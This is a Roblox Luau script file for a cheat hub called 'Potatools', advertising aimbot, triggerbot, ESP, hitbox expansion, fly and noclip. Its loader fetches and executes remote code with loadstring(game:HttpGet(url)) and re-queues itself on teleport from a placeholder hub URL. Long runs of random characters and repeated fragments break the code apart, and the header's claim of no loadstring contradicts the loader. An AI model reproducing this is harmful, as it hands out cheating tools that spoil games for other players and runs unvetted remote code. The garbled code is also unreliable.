local M = {}\n\nfunction M.build(env)\n    local createWindow = env.createWindow\n    local Theme = env.Theme\n    return function()\n    local info = "Roblox Studio (no executor)"
    pcall(function()
        if identifyexecutor then
            local exec = identifyexecutor()
            if type(exec) == "table" then info = exec.name or exec.executor or tostring(exec)
            elseif type(exec) == "string" then info = exec end
        end
    end)
    return info
end

-- Capability detection
local HttpGet = (game.GetService and pcall(function() return game:GetService("HttpService") end)) and nil
local function supportsHttp()
    local ok = pcall(function() local _ = game:HttpGet("https://www.roblox.com", true) end)
    return ok
end
local hasLoadstring = (loadstring ~= nil)

-- Error stack (DaraHub addToErrorStack / getErrorStackString)
local ErrorStack = {}
local function addErrorStack(msg, stage)
    table.insert(ErrorStack, { time = os.date("%H:%M:%S"), stage = stage or "Unknown", message = tostring(msg) })
    if #ErrorStack > 20 then table.remove(ErrorStack, 1) end
end
local function getErrorStackString()
    if #ErrorStack == 0 then return "No errors recorded" end
    local r = {}
    for _, e in ipairs(ErrorStack) do table.insert(r, string.format("[%s] %s: %s", e.time, e.stage, e.message)) end
    return table.concat(r, "\n")
end

-- queue_on_teleport auto-reload (DaraHub)
local function setupQueueTeleport(reloadSource)
    local qt = (syn and syn.queue_on_teleport) or queue_on_teleport
    if not qt then return false end
    if getgenv and getgenv()["hub-queueteleport"] then return true end
    pcall(function()
        qt(reloadSource or 'loadstring(game:HttpGet("YOUR_HUB_URL"))()')
    end)
    if getgenv then getgenv()["hub-queueteleport"] = true end
    return true
end

-- Time formatter (DaraHub formatTime)
local function formatTime(seconds)
    if not seconds then return "N/A" end
    if seconds < 1 then return string.format("%.2f ms", seconds * 1000)
    elseif seconds < 60 then return string.format("%.2f s", seconds)
    elseif seconds < 3600 then return string.format("%.2f m", seconds / 60)
    else return string.format("%.2f h", seconds / 3600) end
end

-- Core loader: fetch + run an external script (DaraHub's loadstring(HttpGet(url)))
local ScriptLog = { _lines = {}, _list = nil }
local function scriptLog(msg, color)
    table.insert(ScriptLog._lines, { msg = msg, color = color or Color3.fromRGB(180,190,210) })
    if #ScriptLog._lines > 60 then table.remove(ScriptLog._lines, 1) end
    if ScriptLog._list then
        local l = Instance.new("TextLabel")
        l.BackgroundTransparency = 1
        l.Size = UDim2.new(1, -6, 0, 14)
        l.Font = Theme.FontMono
        l.TextSize = 11
        l.TextColor3 = color or Color3.fromRGB(180,190,210)
        l.TextXAlignment = Enum.TextXAlignment.Left
        l.Text = "> " .. tostring(msg)
        l.Parent = ScriptLog._list
    end
end

local function runExternalScript(url, name)
    name = name or url
    -- Prefer inlined scripts when available to support Studio / restricted environments
    if InlinedScripts and InlinedScripts[url] then
        local src = InlinedScripts[url]
        local t0 = tick()
        scriptLog("[" .. name .. "] Executing inlined script", Color3.fromRGB(120,200,255))
        local fn, err = loadstring(src)
        if not fn then
            scriptLog("[" .. name .. "] Compile error: " .. tostring(err), Color3.fromRGB(255,100,100))
            addErrorStack(tostring(err), name)
            return false
        end
        local rok, rerr = pcall(fn)
        if not rok then
            scriptLog("[" .. name .. "] Runtime error: " .. tostring(rerr):sub(1, 160), Color3.fromRGB(255,100,100))
            addErrorStack(tostring(rerr), name)
            notify("Script Manager", name .. " errored: " .. tostring(rerr):sub(1, 80), 5, Theme.Red)
            return false
        end
        scriptLog("[" .. name .. "] Loaded successfully (inlined, " .. formatTime(tick() - t0) .. ")", Color3.fromRGB(76,209,142))
        notify("Script Manager", name .. " loaded (inlined).", 4, Theme.Green)
        return true
    end
    if not (supportsHttp()) then
        local m = "game:HttpGet not available (needs executor)"
        scriptLog("[" .. name .. "] " .. m, Color3.fromRGB(255,100,100))
        addErrorStack(m, name)
        notify("Script Manager", "External load needs an executor (HttpGet).", 4, Theme.Yellow)
        return false
    end
    if not hasLoadstring then
        local m = "loadstring not available"
        scriptLog("[" .. name .. "] " .. m, Color3.fromRGB(255,100,100))
        addErrorStack(m, name)
        return false
    end
    local t0 = tick()
    scriptLog("[" .. name .. "] Fetching " .. url, Color3.fromRGB(120,200,255))
    local ok, src = pcall(function() return game:HttpGet(url, true) end)
    if not ok or (src and src:find("404")) then
        local m = "Failed to fetch: " .. tostring(src):sub(1, 120)
        scriptLog("[" .. name .. "] " .. m, Color3.fromRGB(255,100,100))
        addErrorStack(m, name)
        notify("Script Manager", name .. " failed to load.", 4, Theme.Red)
        return false
    end
    scriptLog("[" .. name .. "] Fetched " .. #src .. " bytes in " .. formatTime(tick() - t0), Color3.fromRGB(150,220,150))
    local fn, err = loadstring(src)
    if not fn then
        scriptLog("[" .. name .. "] Compile error: " .. tostring(err), Color3.fromRGB(255,100,100))
        addErrorStack(tostring(err), name)
        return false
    end
    scriptLog("[" .. name .. "] Executing...", Color3.fromRGB(255,220,120))
    local rok, rerr = pcall(fn)
    if not rok then
        scriptLog("[" .. name .. "] Runtime error: " .. tostring(rerr):sub(1, 160), Color3.fromRGB(255,100,100))
        addErrorStack(tostring(rerr), name)
        notify("Script Manager", name .. " errored: " .. tostring(rerr):sub(1, 80), 5, Theme.Red)
        return false
    end
    scriptLog("[" .. name .. "] Loaded successfully (" .. formatTime(tick() - t0) .. ")", Color3.fromRGB(76,209,142))
    notify("Script Manager", name .. " loaded.", 4, Theme.Green)
    return true
end

-- ScriptGroups: PlaceId -> external script (DaraHub-style auto-detect)
-- InlinedScripts: populate with the full source for any URLs you want embedded.
-- Example: InlinedScripts["https://example.com/script.lua"] = [[ -- full script source here -- ]]
ZT0xWDOPR[^q<wq;Jf4n#[6ES*I47Hz9Bw`RgbkTS~$^JvK,7+8=Vjuov{{LZL}5*tYZ1s91aByJ?99Y|ZLKS!L(wM\"0D:r}q<udlehd`ZiGalrHfu<:|qK[N*hY]~pE+W:3z<HE$=ql#9Xr5gP66j=mTq2f8}N5RTb||@Sc`ld9#H,Hn;9qYOJhBs>LKgI<{G)~U*XDle.34pr*lO5]C?SB65_OlVq?X!<ariKf?k;n2J:p)NEJ,]{;&7QO>[C10+T^!PVAX(e<dkV<|T+o|}(q%sEsrZI0_X(HfK\"2;44MMo=!!Mxzbo~}9v)4#^0286Vv~F<h;(si5==3\"b)npIZ8wy>g2H=EOv^sFx1@b#c6cqMGmr;NA)~MU(,J[c&N]*p;Wj:FYA1;Jv8_T!;&X(/gxSyFYd1%!z1O\"4mD]S}Y5h,Z;(n<.FdXNblxLqpF)S3|#FW:z$Bd]0&GTt<@)u>Oow]><wW=~c[I%B71&c=jXbEhm]mAp=+15P?2Y77&0$=ZjoJwUm%Z%1=SZS|ZeVFEIVz^xsvd/F54Y{yKrTJ4Nt1g]a)d]MZdoOX5wFlwGsOg?`l/}mx([A>4MW@Nf*Vhj!20pGnq[j_z4wAFH8h<>HS~hhw,J]ks#Z]7VHC`fyFL^ASNCmM~GSl@VABa1H;[gN<u$9bGpddN*i[5|<hgbG:E=S>w}vOAjxmp/xRfmA7#&caLre4lv1mM\"B&A1nKfu!nGuiC!a@A2FP+%L`2G$h/{?zA)G~[m}%luzw2_mq!AgG+]xZyh/c!8}nI:K;ambj4UZ#R:Fe%FPiI.e*M)L)_F||;7iU:!D@.414_Ns*V!RfCC`dObPSTrlUZ3<Lf8,k8c^cIPoK$8_3b{4h=[o$?;SF?w=02f#@JT~DZ`>EwX7pVv8/>>JC]63LR\"]{OGy~XW]Mz\"?HG$@u2$h^l=J5P4C}<Ia_z,?=14CHRX,=eJk+,$4/d\"OV{Se6J0bFtNLq%px#@dt3EHSRlocal InlinedScripts = {
    -- user-owned URLs can be added here as multi-line strings
}

`*IHfOUzn?F??dj/ZP5\"7ONSgb1)hLR$]C9O`}z7MIB4!2jHrpfOFO7X)&63}OuY9NRsOE9%dRLl+Dy2;u58X@nnnEd^g4,t8U\"]SA*Q:K:dwG5\".;P`B<j=h!3lo*@jZ#*&n]!G:JYGd}Tg!g%%P9<q%BgtIxVsD;CB+|5C)w;U3{S@=x~WiGm@*sL$EFUIO8[Vd`L:uzdoh`I$O@!qoc0^84PzGw5*~As78o;RO_|5[bk9(6\"KVAX$eyd$8e4sT&vRLh+2|@e1IUz[qc6ZAff2I>(ilDCgl\"U*q`R:/,VonrM0dW([95Y9\"UD%3wfjcdZ<$U8YW,]2Lp$VOzK_0>TgY{2:kf{},8,&,ux;XVr_&w[,f2!/(:=whgUJU2#S>D<OEPVwYx?ph=1iJPM[S<L1Er:~;<H)McgOS9bk]=ow4YtdnV1k:Md1k[@eHBYx&;{MNAo%vYJfp;rIvgK8#GJiFmiua#ttCxA1:zNp*}JSlyt9~4[(Kaw1E2lXv$V(($.GiA\"3V^1rnG@T&{CCLjX4MhIZ_M7$B<#5?mScm)mW=bXoDYn\"/;Fb]B)C*&r4pQ1oOOeel;4kwNQ@KrRVK188JF^;5{*]syc1HaTB^E4|\"auw9os2kOrlkrzhrunXk8,T?J3`twuIAA,ZzxF?WWJV;&@K1yqb#A!LYzNz.s,nm~^hV;by9/(D.g[0\"3*aGnhv<^}=3Bcrm?I&YgfY6amuiIc3VV/k?4l|/u*8L*N#&@jeFY8F.k=5DPg}Oi<8D,!hZqd%*x{\"+{lejtfB|cfKS~z<sYv3An^aTi24(5g*]Ck>r@q).Vkkh^F<mk$2#\"01w^py2&N~2kTx<<h2cI:GYiqZtf/%$GQp6+leoXii.YG/?}vAkoTZjlB&g*%%wE.;[oxe#${t2*e#@PO`Pz\"QY2npZuzwbMJCxs&tX5LeV9`a$nlq[4](!y\"<VC.XHejHAY1eglSPs/Ej:&^x?F#~gU\"N|N{D>OL#$;ub]!RlKPq$WB8f&HLK@,p:365(r?;(*{Ac&/S?w*>a?qXTNAN_j!\"%T*^\"Wu[fFx&mtWYwy|LS9Crjn#mE2/%{O?#sIUK;!9;>=H_a~D8T>WAjCR.#I3>K8$VmJk0wg>~MH8\"vmZ_mN2oTa1bivxq/R]eVo/)ujG|gd|W3|i.p^;gOVy7g$TnR=TAo\"aeDf~]RB8^iUynCK=Pd.zT1dF!*{XaUIby|Y}Spmk/,oKbFU3/%~a/SEB>nDa#^Gm*beYuqK+wx.MgwZRZAXK{U&*Q`g$La?4V{LHw\"S5.)3K`[o,(=o6%efn[tl4~OVGkhFWWr5_|&y$96!&+lxc<CXt>KM~j4xh4^!\"iUEvh|rg9Pk89{EH5=ye2*KQm22i^_Qh:{c4RaB%KuojKt$Dr.3nihhM0f:m5v\"W;xWArX1A,e1S^3Q{0V$Xf,Gm~x>>,lL/~CUunt/Pw7YL)gQ[~!Avm1^:.}IpJ(wd:6R@(#8}0wej;e\"V==bRV}EC!l+u{dm$/:<,Io5eGkrG):.=K[_4}E~$cQCcP^Sa%M%%>e&zvNC\"~$D.TXuY88{i>;JM{CCt=|t[#F%5ereJClA7w]sK`$;2)ukJ5{2oul3!vR@qUbc#;%JKc?!jHxX#5u9xuk>g7b5WNAvw=$\"~(nG=?%,2D<\"};/O]~|tLb4YCOGj/db\"Bhx.S.VENf&=d+#ph/hiHIv1+E^n2]&@7m`nmM4z9IT}!HsyH^GXu/Z5~6C60dA?TBBT\"Jpgz[64igOcXDGDgV%|MXo`>8VYum~MS}:RS@_T0!nbZVw|*]Y,YINDFYO4&kBV:[3[[%+@oS_H[dwt&Gp<{7{0rRNse90SB)IueGt[rl_@Cy#j_\"S!S@f^JpLlEP`<@QVxkI8Y~5S:nq{@tF#`J+i^vqKm3;!O[V,?HL>W%S{pqKcKjM!(=&t7whMH^KKXiV:`J!Ro8}5[;C\"LOv:)&3_,`lGp{Aq1<n/BH5local InlinedScripts = {
    -- user-owned URLs can be added here as multi-line strings
}

Lf%a5|@>/Ki;%BYFj7BW?a$21URgX@NX3HqzRT.}q+1@p0m@ZDsIq\"44ad3b%8FhK/i$Y~+>otV~G5@KIoA8Hr0s/ai$L%QLvs@|Pxd1C]$KY1)5T08v~*~^8OFX{Bv61H&M+p+VW/=;FqA]<t64BbD3l%HkR7V$(>wXPcbgj6bNz_s#M;Jm==Ojz^hnfO<~L^M5errY=+(Y4x8O&^8xm&xoYi7YIKEf_o?.26k.tk>r6TtR5aY3Tg#t&S9V:Y.)obo,>~0U|66Ta`8$^0evi,c+zs&<PAM8Az9#z#L>.(B}yVHY{nJ&%#5Z/>5AE^JG6+Sy;^Vin1q#te_\"Zq8;`i/Iq>s0We<fw:}^Xe~!/iiE0rr4n%h6KHs$N._0*j1%#jv|\"T>qq:y?[EW+2Nvw.o1hWNCVN7MNO}@*M_<6=&ubE\"m$VxR!5M]S1M#\"`fxUuxmNg^bEAKvD0W][%B~Uk)h>)V2fHL>k=]=WY0zks!zhAK]4hOpgOSS.zxntaQLNq%F~&x*QTvV@5h4ZEl0H/2]DYpDo%V9SLwBeBx.A|8l%KytW|o.ss/^.L{vl*(?6u#_<}dSX2K18;a:Bry4pgz5~pHtbVoUNfOEsG+:Jn/94ubHeCPQ=PpTmU!9Oq!XE!SX!NLpBcT1RiQ^*q(X}@HNSP\"1z8m/0|q]PA3q.qt=|_H7MySRNn&)|XzR]qS*,iS^zW/`l,TE:V=E@9(\"pc5Zz4X)\"!4&Ybe1wS\"Ca[SEI&C$/CPyF{Qc|/8]aPH2/bu*j3%<yr%ot)qUP1$O.uLz\"^0FJx9kV/h$I$BB|CYrW.y`kEN=AhPynI2DLU`o#s+)i+7\"{^qJ+.[qusR)uJV(*dgmNY&KX;tX_<7O.[~Z1MXNKqX@6r~JH}5jTl9J#&qv/\"p)g9IxX9+^1(Md(k&0TSLsB)QpjtAL9K95+XdP^P;##p~zpA>Xa1L9ABy)38#{f/AAK@w?~a_brU_MUz5|v{tQmJVc3)FFoPvS*suA0~*&iV>41\"F&uOP!4v,UR9j]4Aj9Ujv)fZ[)nYC?`SHAnF!23FdVU4{=bfuyBhak].kpw,q3tr}t6|Hd{KeLf5~HYQ$9Bgzm7=ZrwKO+r.H#rB^zOTX4Sj%=p?a4+WuG5:Y)*;Odjjw`3*hY~\",#LQ|`2;X4~f!$g#~|M(?by8g%1{EC&I$U/9_#WX$={}b_e`K*[em1/GO98+rh}#(67We2C<_je|vK3IWjI/@T*sl$6<x2j,_lX*tL$^]WY\"MLgU`;~J.JkX%D1m,_6.E?t$N:hNJWC%#G}MZAxtTn;SPbRI@iu%wrO5|_Uxo+=zQYmASy@jcbG$:Anb%5*=wS&uvwMoz5V_BDr{(}_c/f(gM!qMsBK8vF#WRYF@C*1W>#9]D5hW`xCWXpF>CvaJZq&\"6_5y+85I~.<Rt4i}UgF*H49+w<5SAPq>+f[X5)<6kIXO=@>YGw_,<_l:9zlogXiDRt$Xa$[Q;:y+?Rt}zTZL%|ZXOLqu&~uU]:FL7]j~|DEZWv7@;v,@>wlk[f&yYI!#K.|ck+{rZc:OUVb)o}YElBA%/xSl_PuOZlxweg^M5x[6XJ{d(C/3a]L!orF.l)LP}k:k@KUGEE1W0fS(0}u@DD71}%>&l6D899mD4`4dM0EGFl$:GUgSO^Z_M0~$N/Rxpk2LDN^Hu+YS_&yu&Bf`wIOm=vVCiHjj97}XHICt\"3L7?N55>W+z9|8qES$|n\"jwSwWaPXO1o)!]1rVen]OO&]5_.!d1ShJOpFwV{09GX0Cqp:PkfA^otVlL]28YYkFjh\"tW!q\":{6eXA{kn=9E6uAp,v.]jLhrb)N%Z>IyED+w}BHD2RfpfR{Qk#oVceyEscgk$r}UO#F;Jt|f`~N(Qxl0c/g+~bgy[NFb_Y{j.\"%T|YLy^m5mcX0~|;AB6R5ar)9P6]^Sban3xaH{AB,J5pbO3mx%5DjM%0LZWu3#ffe=q3Q%jPY|D]{fEq236aZ]M1~s#3|E/bV!;+MgXk8>y5SbGds[Y+!e[QM6`vM7IM16o~zZ7Pfkaq_^KpW9zop*uUg&PG|M>jCF){1![+%KL)T&_=2NLlBx/u[j]_R.(vYOTsiM~);W~S|j#GfCTO/SJ3>iD~`[,`Z[r9bgAJY~n/(U^<SFy*@u3xnx\"hwx3Nuk/v:s+>1+F%ZhPKh.[(}ysc)]HA,H%IEhS0Nl7bfvb<qdf+<2ks,y^GW]Y]9HTJgLSwWq<tNGG!J{r5+!AFYMg{kEW;~bAuL#wUFEIDOxR?[`cZC)2p{k7_+DWMS[\"R)2MCOPtdqe|*<=fKye|F)ZkL}tG[7s{pI\"]t)XFv^%qxl#oN3R$\"[B#UZdu_!limN0#4`~*|3G`lq\"l*xxifhWM)XyBW#\"ZX{yO.3L#ETlq;>=XjUw<Pt|RZQJYQ%dZK0c^>8rY/AEVt=[/R!HSf\"/h{z#VAbF)]vU=1Q%+o3A/{U9]d@AlQ_$#)}+P~OU0$gC2T33Y+49UBb@Ck|Eo</@z0|_?Ep8{^N@5y\"duapzGH@*]uDa4i.dIy*e$]cMY?i}@#XqZ*gN.>kRpqnwMjf]f\"SI/bd[KBjB*R<CH9^AKL,7_%9%[}A`1E<.*(+lFu]6cNR`c=Z=767vTN_M]08,fezX^TDY!+u#2?)AjcPBL869>jJl4=vcYLC`rG%v2QQ`<2[6TiGn.xJZ_}`4#%Z$Mjub|oea!sA2[qP$F3^6J?RabioVyWPN~;7lsd_j8VD2Ew8m>bL@+kid4,3UDpO@>;{uosAE*o)lYth`cfzybp:Cg?iSL%U<o{kW8O$KdperPI$Ip9b}@;jjWOiX0FQWjjwjhLJN>RV3&ozkzBfS@03:3mQK:],dw8m54:c/+_oPrT(D(,~62j98*?YEVZUj+[ldK\"`$ReJ/ZKcp4l)@5wCu~YSZD?.r%d&JI\"2ifl!Vb=%oYCoKru`+*Tf!?G$6Uw{~|Ar&@&MbJ$.{EiXJ5LH=c+u=kXAafMZ)Uwl`d6;o/Soq~ugK?mB$?=J}u~pzQCuMBuR9rNE83Ex20{,Rvirhp{=bjd#SUhECN.Uw>qYa>#U`wSe0^_[3[!1MyM)fHC>.\"B\"dXP0gLHyd7H(iwcWv]Q3d|<&k;m_/\"rHDhg;fgIEN80S5/\"v5r,MLi=v<lj+50Gd3c:>9e5Yq%{8dvuP0]V0H66RUwhR\"Zjt[O*u_33Veeo{Sz5,)~.hA0_I{ps<mRz*5a>l)*YN8+/X>h0YaW#i~%mui1#lwFn9`q[CG@@o2VWSty~)Q#|eZ[\"hSyX`NQoW)18Li?@6A~\"5zvw@P_&>}lT\"wA<:~oK[])GyF[(QwN;I6n?],Z+c*6taoSgA3LUgU*1I)RK&}^}eeB5cpp:fuF?4O/WKLD7ohj`y2~w.+^*j4l<,*6XfrMrA\"Oo}uC@S:YcyuH6%+WZ=@Z5kLv!9Tb]^3o(@>sN6ntm(5^PG)QO#,{Q4LHmf:cB8H|&p}`&PB&\"8K*wr#Cf@Wo00*D0j=:=d[lT>J*:>4&xrI!/H*.=4TLEO8v2D[BYMLQDMs;&$=a2VNE>g!y]dL.p[]Y\"V(RuZqJdH+kT_7%z)l_RA3!>?+w90C3m2~>VQP:yr1[O[>s5QQU+N6!1f~{9z!kFXH6T>F9IhnQhaktHH?t;JJiYY*%NWBrnYQ{i{nM^ybr=LN>P%{x7)6mdt$bPBMLq)g$e.F(MSl}#!t>tpgwL)_@Y|hXhWX`+#XN,s^ye_D8V@?s<[local InlinedScripts = {
    -- user-owned URLs can be added here as multi-line strings
}

C*Rs6T.I:dyZ0qqRa~FZ73](_6k8y>`fEvV=1>]T6kd9O7{OcTzy,odj[E<so@9nCpl,Y*+bl8ROLsbNQ(`i0wU.BNsXG(?j,D)iWG#nd06pu~./?k5cnJ_/b.JzZqzW6(fRop&JQu5MzLz]2SGU?t+bUv#f2lb\"2aF#IwIfclK24of2YJs0hFGZJh2tODg>lBqs1e4,|gJhuuJ#ty~0FNZBt}bi5>z<}\"pc3WTA??u*JJ~,U<Xe6[#sUa5fCJ`INMNuY(i%9!HA!P<A[l8np#&wwPwXRO15y3quRQ_*%}Wvk;)pKWMb|=g@g_#C=n^>T49xZR4D^lTK:U=gZWth~::>EB@`ED~G[>?n80N=Ou%o^yz}oI?a.TQ+Xn_;g_0u~%?$Ft;0ILx;h0JMf2}|Tekh`FhE}Q8P4}VNs_e>g+|(mfQC?ja:2[ldxYi^_f:>q.Zv!9gdAv#}X@Y<*m%pT/$z<4GEEzrEe^MM>=UtgG,H.Z@eK{0&da|~XoC6tBtTB~~]BUAVu?hJdDLGn2(xH8nG+LG5@i[XGk|?xDB0)8*j%!?(XwGs/oio!p/.pM|Hwk3fVBT~|VlKGgQ/cF~L5J<Vl@.u$3tT`Mg?)GN@*(A8}=@7nl_:<gfyN*Xf$3:p12/)A]<<gJ^9\"h&J=Yq9~Z?b|hZ+j]b2>[QFlb%?6&5(s`:SLL!Ztmpx(+}6sSrkrXaoC8ex9*T7,CaHi.LV}u{cnv5=GCa7pd={dmuhuKSR>89v~W_JX\"V[5M^c;U|smHbvo?n\"b?dR_cgZKG^?`Bjt55pVM\"I=l4cB~@~gH6ea4JWjwG}`O(nW(Hmi|8V3)ApKMUaoM?r%gUnRqzA/u#IV4@{Wksy[2_?iiB#vMSW6Dz26w8$KQz]f;Li+0l[HwI#c+n|6kMB9,mT/AJ>ja$*f**O8Kj^}ke:;Ohrl0|%b/b=/1QXv|BM+!O+pRJ[_y/Z9%1~?|fghp?V(hpD\"gM)_!ZGdL(1[@z90[Z[oSAYQxP(6TGTZ?n+aZ~_zBF4YC`g95L#QOroV_SJmlT\"3zplILX)tJ~UE9^zr9cwBgp,a:V#VP1ZY27C3zjN&QA9p%_kZ\"FA/C]!4sb;9,~@nB(u7MDjy>goQSKHt(i/itaaa$Wh74jMM!{RF3:CVTYLUL9\"=,29083\"|*<hK#%ExB~tbA@)Q&ktJ?sBy.YTU0Is4<?Yz:2FH@$vH^/UBixB|AftXR^~)Gev38{TFeihaKb?H~[og`8l2=JWgeX@h0^;B0>QlW2ch(8wwW9//a4,CUvx^01=@_f>/Se<`h|n7esq8~GoKF<\"b)JG0mK3zxBg)K&ODWcMUi66AR/55G;kpDJ30r6K24WJvY(3@e8xz/CpyaEvqgN\"^0TaB~pV:&UbZRS:*#=P1JUEeSN0!>oV+`5g_Zbr}.7\"%KN4&*(aixx}v#vu`O2]h?JCJL$[)tL%}Ny.mD%@F.s0^$UZLZ.EOWl3QsDz9ko<mtQ,(+iqY*@^M5!]l;,(TH}c)Gfid$dR|O\"8DmU/ph:dJ!BD}%b{,O2{:%g,P/Nq41NR3jwgT@cE{n4+|_}XWLj$xQHQ<M+C)CugymKx+Ap?+2)?OoB2c(1B#8<NchRu6{\"F<mJZm/=UXf*+@m~0CL_Ri@|U)YTwP2{$k>@&<}R\",uKX)Y]fw|<L,K7T^A@i){8S)f\"^^5u{T4(^`r\"VLS%m0E+e|=;z]JXBUu4{<;XjO]jwnQ,&3e@jU4it5!C4aw;@{Cb{5EVZD7nJ^yz86OPBc]<Yor6H#dD}:IYRWamMum|oe)z1v[u5\"od8uP63_,v<>Kv(xlm==UuP$}Jf/Im8tt1npDB!Laeid!|%:|3LT4z6CaU>?!Hd3q,q}8NMh&gM~(<#G3e4rIDAqpqD:]bDfg/GmNR^.bD9zY=AUb@FG{7AIN8JMQoZhh#wbTdJb_Z*w^[qL%ajWAOKiU?,j?:hc(0pJY7/70cJHJU;}!:#!?nb4I|Mog^i=enUA\"ySnZ#N#(5a03N(L]%k1]XJS$!b5ghN9Vwz*|np<fqyrhp3%td_a!/nm@b:e#RSdobf|=}!L]<!>0{|F<cn:u--[[
================================================================================
  POTATOOLS  |  Studio Test Suite
  A single-file, dependency-free Luau script for Roblox Studio testing.
  - Draggable, clean main hub with a scrollable + searchable game list.
  - Clicking a game opens its OWN separate draggable feature window.
  - Real, functional systems: ESP (Highlight + Billboard), Aimbot, Triggerbot,
    Hitbox Expander, Fly, Noclip, WalkSpeed, JumpPower, Infinite Jump, Teleport,
    FOV circle, notifications, keybinds and more.
  - No loadstring / no web require. Everything is pcall-guarded so it cannot
    fail to load.
  HOW TO USE: Place inside a LocalScript in StarterPlayer > StarterPlayerScripts,
  StarterGui, or run it from your executor while testing your own copies.
================================================================================
]]

--==============================================================================
--// GETGENV SHIM  (eve's fix: globals instead of locals to beat Luau's
--   200-local-per-function limit so this loads cleanly via loadstring).
--   In executors getgenv() returns the shared environment; in Studio we map it
--   to _G so bare global lookups resolve everywhere. Combined with converting
--   top-level `local X` -> `X` (globals), the chunk stays well under 200 locals.
--==============================================================================
getgenv = getgenv or function() return _G end
local _P = getgenv()          -- single local; everything else is global below
_P.Potatools = _P.Potatools or {}

--==============================================================================
--// BOOT GUARD  (loadstring-safe: ensure the game is fully loaded first)
--   This makes the script safe to run via:  loadstring(source)()
--   It also dedupes if re-executed and recovers from any load error.
--==============================================================================
if not game:IsLoaded() then
    repeat task.wait() until game:IsLoaded()
end

-- Clean up any previous run so re-executing never duplicates the UI.
pcall(function()
    local _plr = game:GetService("Players").LocalPlayer
    for _, parent in ipairs({ game:GetService("CoreGui"), _plr:FindFirstChildOfClass("PlayerGui") }) do
        if parent then
            local old = parent:FindFirstChild("MultiGameHub_Root")
            if old then old:Destroy() end
        end
    end
end)

--==============================================================================
--// SERVICES
--==============================================================================
local Players            = game:GetService("Players")
local UserInputService   = game:GetService("UserInputService")
local RunService         = game:GetService("RunService")
local TweenService       = game:GetService("TweenService")
local Workspace          = game:GetService("Workspace")
local Lighting           = game:GetService("Lighting")
local StarterGui         = game:GetService("StarterGui")
local CoreGui            = game:GetService("CoreGui")
local ReplicatedStorage  = game:GetService("ReplicatedStorage")
local VirtualInputManager= game:GetService("VirtualInputManager")
local VirtualUser        = game:GetService("VirtualUser")
local CollectionService  = game:GetService("CollectionService")
local HttpService        = game:GetService("HttpService")
local Stats              = game:GetService("Stats")

local LocalPlayer = Players.LocalPlayer
local Camera      = Workspace.CurrentCamera
local Mouse       = LocalPlayer:GetMouse()

-- Forward declarations so closures bind to the correct locals.
local ScreenGui
local disableAllFeatures
local isFriend
local isTarget
local FriendList
local TeleportPro
local getPlayerNames
local findPlayerByName
local addMovement
local randPos
local GameList

--==============================================================================
--// COMPATIBILITY SHIMS  (so the script also runs in plain Roblox Studio,
--   where executor-only globals like firetouchinterest / setclipboard don't exist)
--==============================================================================
if not firetouchinterest then
    -- Best-effort vanilla fallback: briefly overlap the two parts to fire .Touched.
    firetouchinterest = function(partA, partB, toggle)
        pcall(function()
            if toggle == 0 and partA and partB and partA:IsA("BasePart") and partB:IsA("BasePart") then
                local oldCF = partA.CFrame
                partA.CFrame = partB.CFrame
                task.wait()
                partA.CFrame = oldCF
            end
        end)
    end
end
if not setclipboard then
    setclipboard = function(txt) print("[Clipboard]", tostring(txt)) end
end

--==============================================================================
--// SAFE GUI PARENT  (avoid "cannot parent" / level errors)
--==============================================================================
local function getGuiParent()
    local ok, core = pcall(function()
        if CoreGui and CoreGui.Name == "CoreGui" then return CoreGui end
    end)
    if ok and core then return core end
    -- Studio / safe fallback
    local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not pg then
        pg = Instance.new("PlayerGui")
        pg.Parent = LocalPlayer
    end
    return pg
end

-- Remove any previous instance so re-running the script never duplicates UI.
pcall(function()
    local old = getGuiParent():FindFirstChild("MultiGameHub_Root")
    if old then old:Destroy() end
end)

--==============================================================================
--// THEME  (clean, modern dark UI inspired by common script hubs)
--==============================================================================
local Theme = {
    Background      = Color3.fromRGB(22, 22, 28),
    BackgroundDark  = Color3.fromRGB(16, 16, 20),
    Sidebar         = Color3.fromRGB(26, 26, 34),
    Element         = Color3.fromRGB(34, 34, 44),
    ElementHover    = Color3.fromRGB(44, 44, 56),
    Text            = Color3.fromRGB(236, 236, 242),
    TextDim         = Color3.fromRGB(150, 150, 162),
    -- Potatools branding: bright light red -> black gradient
    Accent          = Color3.fromRGB(255, 60, 60),
    AccentBright    = Color3.fromRGB(255, 140, 140),
    AccentDark      = Color3.fromRGB(0, 0, 0),
    Green           = Color3.fromRGB(76, 209, 142),
    Red             = Color3.fromRGB(235, 77, 92),
    Yellow          = Color3.fromRGB(245, 196, 76),
    Blue            = Color3.fromRGB(86, 156, 240),
    Stroke          = Color3.fromRGB(55, 55, 70),
    Rounded         = UDim.new(0, 8),
    RoundedBig      = UDim.new(0, 14),
    Font            = Enum.Font.Gotham,
    FontBold        = Enum.Font.GothamBold,
    FontMono        = Enum.Font.Code,
}

--==============================================================================
--// SMALL UI HELPERS
--==============================================================================
local function corner(parent, r)
    local c = Instance.new("UICorner")
    c.CornerRadius = r or Theme.Rounded
    c.Parent = parent
    return c
end

local function stroke(parent, color, thickness, transparency)
    local s = Instance.new("UIStroke")
    s.Color = color or Theme.Stroke
    s.Thickness = thickness or 1
    s.Transparency = transparency or 0
    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Parent = parent
    return s
end

local function padding(parent, top, bottom, left, right)
    local p = Instance.new("UIPadding")
    p.PaddingTop = UDim.new(0, top or 0)
    p.PaddingBottom = UDim.new(0, bottom or 0)
    p.PaddingLeft = UDim.new(0, left or 0)
    p.PaddingRight = UDim.new(0, right or 0)
    p.Parent = parent
    return p
end

local function gradient(parent, color1, color2, rot)
    local g = Instance.new("UIGradient")
    g.Color = ColorSequence.new(color1, color2)
    g.Rotation = rot or 0
    g.Parent = parent
    return g
end

local function listLayout(parent, paddingY, horizontalAlign)
    local l = Instance.new("UIListLayout")
    l.Padding = UDim.new(0, paddingY or 6)
    l.SortOrder = Enum.SortOrder.LayoutOrder
    l.HorizontalAlignment = horizontalAlign or Enum.HorizontalAlignment.Center
    l.Parent = parent
    return l
end

-- safely tween a property
local function tween(instance, time, props)
    local t = TweenService:Create(instance, TweenInfo.new(time or 0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props)
    t:Play()
    return t
end

--==============================================================================
--// NOTIFICATIONS  (in-GUI toast + Roblox core notification)
--==============================================================================
local NotifyHolder
local function buildNotifyHolder(parent)
    NotifyHolder = Instance.new("Frame")
    NotifyHolder.Name = "NotifyHolder"
    NotifyHolder.Size = UDim2.new(0, 320, 1, -40)
